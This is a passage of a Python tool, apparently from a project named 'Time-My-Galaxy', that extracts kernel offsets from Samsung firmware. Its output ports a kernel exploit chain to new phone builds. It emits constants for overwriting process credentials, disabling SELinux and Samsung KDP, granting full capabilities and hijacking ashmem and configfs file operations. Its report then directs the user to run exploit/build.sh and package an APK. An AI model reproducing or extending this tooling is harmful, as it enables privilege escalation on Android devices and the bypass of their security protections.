        "SELINUX_STATE_STATIC", "PANIC_ON_WARN_STATIC", "SYSCTL_BOOTID_STATIC",
        "CRED_UID_OFF", "CRED_EUID_OFF", "CRED_CAPEFF_OFF",
        "OFF_TASK_SECCOMP", "OFF_TASK_SECCOMP_FILT", "OFF_TASK_ATOMIC_FLAGS",
        "CALIB_MIN_COUNT", "OFF_TASK_CRED", "COPY_PROCESS_LOW16",
        "TASK_ALLOC_BYTES", "FULLCAP",
        "ROOT_USER_STATIC", "INIT_USER_NS_STATIC", "INIT_UCOUNTS_STATIC",
        "INIT_GROUPS_STATIC", "SELINUX_BLOB_OFF", "SELINUX_SID_KERNEL",
        "KDP_ENABLE_STATIC", "INIT_CRED_STATIC", "IMAGE_BASE",
        "IMG_ASHMEM_MISC", "IMG_ASHMEM_FOPS", "IMG_UHID_MISC", "IMG_UHID_FOPS",
        "INIT_UTS_NODENAME_STATIC", "IMG_MISC_FOPS_OFF", "IMG_NOOP_LLSEEK",
        "IMG_CONFIGFS_READ_ITER", "IMG_CONFIGFS_BIN_WRITE", "IMG_ASHMEM_IOCTL",
        "IMG_ASHMEM_COMPAT_IOCTL", "IMG_ASHMEM_MMAP", "IMG_ASHMEM_OPEN",
        "IMG_ASHMEM_RELEASE", "IMG_COPY_SPLICE_READ", "IMG_ASHMEM_SHOW_FDINFO",
        "FOPS_SIZE", "FOPS_OFF_READ", "FOPS_OFF_WRITE", "FOPS_OFF_READ_ITER",
        "FOPS_OFF_WRITE_ITER", "FOPS_OFF_IOCTL", "FOPS_OFF_COMPAT",
        "FOPS_OFF_MMAP", "FOPS_OFF_OPEN", "FOPS_OFF_RELEASE",
        "FOPS_OFF_SPLICE", "FOPS_OFF_FDINFO",
        "ASHMEM_NAME_LEN_", "ASHMEM_PREFIX_LEN", "ASHMEM_PREFIX_COUNT",
        "ASHMEM_SET_NAME_IOCTL",
        "CFG_OFF_PAGE", "CFG_OFF_NEEDS_FILL", "CFG_OFF_BIN_BUFFER",
        "CFG_OFF_BIN_SIZE", "CFG_OFF_CB_MAX",
        "CHILD_HELLO", "CHILD_MAGIC",
    ]
    emitted = set()
    lines = [
        "/* Generated by tools/port_firmware.py. Do not edit.",
        f" * Target: {build}",
        f" * Kernel: {kernel_version}",
        " */",
        f"#ifndef WR_OFFSETS_{guard}_H",
        f"#define WR_OFFSETS_{guard}_H",
        "",
    ]
    for name in order:
        if name in values:
            value, suffix = values[name]
            lines.append(f"#define {name} {fmt_value(value, suffix)}")
            emitted.add(name)
        elif name in STATIC_DEFINES:
            value, suffix = STATIC_DEFINES[name]
            if name in DECIMAL_STATICS:
                lines.append(f"#define {name} {value}{suffix}")
            else:
                lines.append(f"#define {name} {fmt_value(value, suffix)}")
            emitted.add(name)
    for name in sorted(set(values) - emitted):
        value, suffix = values[name]
        lines.append(f"#define {name} {fmt_value(value, suffix)}")
    lines += ["", f"#endif /* WR_OFFSETS_{guard}_H */", ""]
    path.write_text("\n".join(lines))


def write_report(path: Path, build: str, model: str, soc: str, android: str,
                 kernel_version: str, chosen: dict, cfg: dict, values: dict[str, tuple[int, str]],
                 how: dict[str, str], meta: dict, inputs: list[dict],
                 boot_meta: dict | None, elf_path: Path) -> None:
    lines = [
        "Time-My-Galaxy firmware port report",
        "===================================",
        "",
        f"Build:          {build}",
        f"Model:          {model}",
        f"SoC:            {soc}",
        f"Android:        {android}",
        f"Kernel:         {kernel_version}",
        f"Link base:      {values['IMAGE_BASE'][0]:#x}",
        f"VA bits:        {meta['va_bits']}",
        "",
        "Inputs",
        "------",
    ]
    for item in inputs:
        lines.append(f"  {item['path']} ({item['size']} bytes)")
        if item.get("sha256"):
            lines.append(f"    sha256 {item['sha256']}")
        else:
            lines.append("    sha256 skipped (large archive)")
    lines += [
        "",
        "Kernel source",
        "-------------",
        f"  {chosen['source']}",
        f"  Image sha256 {chosen['sha256']}",
    ]
    if boot_meta:
        lines += [
            f"  boot image header v{boot_meta['header_version']}, "
            f"page {boot_meta['page_size']}, kernel {boot_meta['kernel_size']} bytes",
        ]
    lines += [
        f"  vmlinux.elf {elf_path}",
        "",
        "Derived constants",
        "-----------------",
    ]
    for name in sorted(values):
        value, suffix = values[name]
        lines.append(f"  {name:24s} {fmt_value(value, suffix):20s} {how.get(name, '')}")
    lines += [
        "",
        "Kernel config",
        "-------------",
        f"  IKCONFIG: {'yes' if cfg else 'no'}",
    ]
    for key in (
        "CONFIG_ARM64_VA_BITS", "CONFIG_ARM64_PAGE_SHIFT",
        "CONFIG_RANDOMIZE_BASE", "CONFIG_DEBUG_INFO_BTF",
        "CONFIG_KDP", "CONFIG_KDP_CRED", "CONFIG_SLAB_FREELIST_HARDENED",
        "CONFIG_RANDOMIZE_KSTACK_OFFSET", "CONFIG_SAMSUNG_GKI_KERNEL",
    ):
        if key in cfg:
            lines.append(f"  {key}={cfg[key]}")
    lines += ["", "Warnings", "--------"]
    if WARNINGS:
        for item in WARNINGS:
            lines.append(f"  - {item}")
    else:
        lines.append("  none")
    lines += [
        "",
        "Next steps",
        "----------",
        f"  1. mkdir -p assets/payload/{build}",
        f"  2. cp assets/payload/S731BXXU9CZIF/* assets/payload/{build}/",
        f"  3. PROFILE={path.parent / 'offsets.h'} BUILD={build} ./exploit/build.sh",
        "  4. Add the Target entry from target.java.txt and build the APK.",
        "  5. Verify on hardware; a port is never trusted until the chain completes.",
        "",
        "MEMSTART_PAGE is board runtime data.  The default 0x80000 matches the",
        "verified S731B image; change it if the target board reports a different",
        "memstart_addr.",
        "",
    ]
    path.write_text("\n".join(lines))


def write_profile_json(path: Path, build: str, model: str, soc: str, android: str,
                       kernel_version: str, chosen: dict, cfg: dict,
                       values: dict[str, tuple[int, str]], how: dict[str, str],
                       meta: dict, inputs: list[dict], boot_meta: dict | None,
                       elf_path: Path, arm_header: dict, verified: bool) -> None:
    def js(v: int, suffix: str) -> str:
        return f"0x{v:x}"

    data = {
        "schema": SCHEMA,
        "generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "build": build,
        "model": model,
        "soc": soc,
        "android": android,
        "verified": verified,
        "kernel": {
            "version": kernel_version,
            "link_base": js(values["IMAGE_BASE"][0], "ULL"),
            "va_bits": meta["va_bits"],
            "cap_last_cap": meta["cap_last_cap"],
            "arm64_header": arm_header,
        },
        "inputs": inputs,
        "source": {
            "member": chosen["source"],
            "kernel_sha256": chosen["sha256"],
            "boot_header": boot_meta,
            "vmlinux_elf": str(elf_path),
        },
        "values": {name: js(value, suffix) for name, (value, suffix) in values.items()},
        "derivation": how,
        "config": cfg,
        "warnings": WARNINGS,
    }
    path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")


def write_target_java(path: Path, build: str, model: str, soc: str, android: str,
                      verified: bool) -> None:
    android_js = f'"{android}"' if android and android != "unknown" else "null"
    flag = "true" if verified else "false"
    text = (
        "// Generated by tools/port_firmware.py.  Copy this entry into Targets.ALL.\n"
        "// Set verified=true only after the chain completes on the device.\n"
        f'new Target("{build}", "{model}", "{soc}", {android_js}, {flag}),\n'
    )
    path.write_text(text)


# ---------------------------------------------------------------------------
# Main


def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="port_firmware.py",
        description="Extract Time-My-Galaxy kernel offsets from Samsung firmware.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  tools/port_firmware.py ~/s25-firmware/AP_*.tar.md5\n"
            "  tools/port_firmware.py boot.img.lz4\n"
            "  tools/port_firmware.py AP_*.tar.md5 boot.img.lz4\n"
        ),
    )
    p.add_argument("inputs", nargs="+", help="firmware .tar.md5, boot.img, boot.img.lz4, or raw Image")
    p.add_argument("--out", default="port-out", help="output root (default: port-out)")
    p.add_argument("--build", help="override the detected build id")
    p.add_argument("--model", help="override the detected model")
    p.add_argument("--soc", help="override the detected SoC")
    p.add_argument("--android", help="override the detected Android version")
    p.add_argument("--memstart-page", default="0x80000",
                   help="memstart_addr >> 12 (default: 0x80000)")
    p.add_argument("--verified", action="store_true",
                   help="mark the generated target entry as verified")
    p.add_argument("--force", action="store_true",
                   help="re-run vmlinux-to-elf even if the cached ELF matches")
    return p


def main(argv: list[str] | None = None) -> int:
    args = build_arg_parser().parse_args(argv)
    started = time.time()

    try:
        memstart_page = int(args.memstart_page, 0)
    except ValueError:
        print(f"error: bad --memstart-page {args.memstart_page}", file=sys.stderr)
        return 2

    build = args.build or infer_build(args.inputs)
    if not build:
        print("error: cannot infer the build id; pass --build", file=sys.stderr)
        return 2
    if not re.match(r"^[A-Za-z0-9._-]+$", build):
        print(f"error: unsafe build id {build!r}", file=sys.stderr)
        return 2
    if build in (".", ".."):
        print(f"error: unsafe build id {build!r}", file=sys.stderr)
        return 2

    out_root = Path(args.out).expanduser()
    out_dir = out_root / build
    work = out_dir / "work"
    work.mkdir(parents=True, exist_ok=True)

    info(f"target build: {build}")
    info(f"output: {out_dir}")

    candidates = gather_candidates(args.inputs, work)
    chosen = candidates[0]
    if len(candidates) > 1:
        info("kernel candidates:")
        for cand in candidates:
            info(f"  {cand['source']} ({len(cand['kernel'])} bytes)")
    info(f"using kernel from: {chosen['source']}")

    kernel = chosen["kernel"]
    kernel_sha = sha256_bytes(kernel)
    image_path = work / "Image"
    if image_path.exists() and sha256_file(image_path) == kernel_sha:
        info(f"reusing {image_path}")
    else:
        image_path.write_bytes(kernel)
    chosen["sha256"] = kernel_sha

    if chosen.get("raw_boot"):
        boot_path = work / "boot.img"
        if not boot_path.exists() or sha256_file(boot_path) != sha256_bytes(chosen["raw_boot"]):
            boot_path.write_bytes(chosen["raw_boot"])

    elf_path = work / "vmlinux.elf"
    elf_stamp = work / "vmlinux.source.sha256"
    cached = (
        elf_path.exists()
        and elf_stamp.exists()
        and elf_stamp.read_text().strip() == kernel_sha
        and not args.force
    )
    if cached:
        info(f"reusing {elf_path}")
    else:
        exe = shutil.which("vmlinux-to-elf") or str(Path.home() / ".local/bin/vmlinux-to-elf")
        if not os.access(exe, os.X_OK):
            raise PortError(
                "vmlinux-to-elf not found; install it with "
                "`pipx install vmlinux-to-elf` or add ~/.local/bin to PATH"
            )
        info("reconstructing symbols with vmlinux-to-elf (~15 s)...")
        proc = subprocess.run(
            [exe, str(image_path), str(elf_path)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=900,
        )
        (work / "vmlinux-to-elf.log").write_text(proc.stdout)
        if proc.returncode != 0 or not elf_path.exists():
            raise PortError(f"vmlinux-to-elf failed:\n{proc.stdout[-4000:]}")
        elf_stamp.write_text(kernel_sha + "\n")
        info("symbol table reconstructed")

    elf = Elf(elf_path)
    symbols, funcs = load_symbols(elf_path)
    info(f"symbols: {len(symbols)}")

    btf_hit = find_btf(elf)
    if not btf_hit:
        raise PortError("BTF blob not found in vmlinux.elf (CONFIG_DEBUG_INFO_BTF?)")
    btf = parse_btf(elf.data, btf_hit[0], btf_hit[1])
    info(f"BTF: {len(btf)} named structs/unions at {btf_hit[0]:#x}")

    config_text, cfg = extract_config(kernel)
    if config_text is None:
        warn("IKCONFIG not found; kernel config values will be missing")

    kernel_version = "unknown"
    if "linux_banner" in symbols:
        kernel_version = elf.read_cstr(symbols["linux_banner"][0])
    else:
        pos = kernel.find(b"Linux version ")
        if pos >= 0:
            kernel_version = kernel[pos:kernel.find(b"\0", pos)].decode("utf-8", "replace")
    if kernel_version == "unknown":
        warn("kernel version string not found")

    values, how, meta = derive(elf, symbols, funcs, btf, cfg, kernel, memstart_page)

    model = args.model or infer_model(build)
    soc = args.soc or infer_soc(build)
    android = args.android or infer_android(args.inputs) or "unknown"

    inputs_meta = []
    for arg in args.inputs:
        path = Path(arg).expanduser()
        size = path.stat().st_size
        # Hashing a 20+ GB AP tar is pointless; the kernel hash is recorded.
        digest = sha256_file(path) if size <= (256 << 20) else None
        inputs_meta.append({"path": str(path), "size": size, "sha256": digest})

    boot_meta = None
    if chosen.get("boot"):
        b = chosen["boot"]
        boot_meta = {
            "header_version": b["header_version"],
            "page_size": b["page_size"],
            "kernel_size": b["kernel_size"],
            "ramdisk_size": b["ramdisk_size"],
            "os_version": b["os_version"],
            "name": b["name"],
            "cmdline": b["cmdline"],
        }

    write_offsets_header(out_dir / "offsets.h", build, kernel_version, values)
    write_report(
        out_dir / "report.txt", build, model, soc, android, kernel_version,
        chosen, cfg, values, how, meta, inputs_meta, boot_meta, elf_path,
    )
    verified = args.verified or build == "S731BXXU9CZIF"
    write_profile_json(
        out_dir / "profile.json", build, model, soc, android, kernel_version,
        chosen, cfg, values, how, meta, inputs_meta, boot_meta, elf_path,
        arm64_header_info(kernel), verified,
    )
    write_target_java(out_dir / "target.java.txt", build, model, soc, android, verified)
    (out_dir / "kernel-config.txt").write_text(config_text or "IKCONFIG not found\n")

    nm = shutil.which("nm")
    if nm:
        proc = subprocess.run(
            [nm, "-n", str(elf_path)],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=300,
        )
        (out_dir / "System.map").write_text(proc.stdout)

    elapsed = time.time() - started
    info("")
    info(f"wrote {out_dir}/offsets.h, profile.json, report.txt, target.java.txt")
    info(f"kernel: {kernel_version}")
    info(f"STATIC_TIMER_SITE      {values['STATIC_TIMER_SITE'][0]:#x}")
    info(f"CRED_RO_SITE_LOW21     {values['CRED_RO_SITE_LOW21'][0]:#x}")
    info(f"COPY_PROCESS_LOW16     {values['COPY_PROCESS_LOW16'][0]:#x}")
    info(f"CRED_REQ / CRED_ALLOC  {values['CRED_REQ'][0]:#x} / {values['CRED_ALLOC'][0]:#x}")
    info(f"done in {elapsed:.1f}s")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except PortError as exc:
        print(f"error: {exc}", file=sys.stderr)
        sys.exit(2)
    except KeyboardInterrupt:
        print("interrupted", file=sys.stderr)
        sys.exit(130)
